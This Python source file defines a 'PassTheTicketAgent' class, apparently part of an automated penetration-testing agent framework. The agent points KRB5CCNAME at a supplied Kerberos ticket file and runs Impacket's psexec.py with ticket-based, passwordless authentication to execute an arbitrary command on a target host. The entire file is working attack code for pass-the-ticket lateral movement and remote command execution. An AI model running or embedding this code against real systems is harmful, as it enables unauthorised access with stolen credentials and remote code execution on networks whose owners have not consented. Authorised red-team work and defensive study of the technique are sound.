"""Pass-the-Ticket Agent - Use Kerberos tickets for authentication"""
import asyncio
import os
from typing import Dict, Any
from core.base_agent import BaseAgent
from core.agent_data import AgentData

class PassTheTicketAgent(BaseAgent):
    def __init__(self):
        super().__init__(name="PassTheTicketAgent", description="Authenticate using Kerberos tickets", version="1.0.0")
        self.output_dir = "workspace/ptt"
        os.makedirs(self.output_dir, exist_ok=True)
    
    async def run(self, strategy: Dict[str, Any]) -> AgentData:
        try:
            target = strategy.get('target')
            ticket_file = strategy.get('ticket_file')
            command = strategy.get('command', 'whoami')
            
            if not all([target, ticket_file]):
                return AgentData(success=False, errors=["Missing target or ticket_file"])
            
            # Export ticket
            os.environ['KRB5CCNAME'] = ticket_file
            
            # Use ticket to authenticate
            cmd = ['psexec.py', '-k', '-no-pass', f'@{target}', command]
            process = await asyncio.create_subprocess_exec(*cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            stdout, stderr = await process.communicate()
            
            return AgentData(success=process.returncode == 0, data={'output': stdout.decode(), 'error': stderr.decode()})
        except Exception as e:
            return AgentData(success=False, errors=[str(e)])
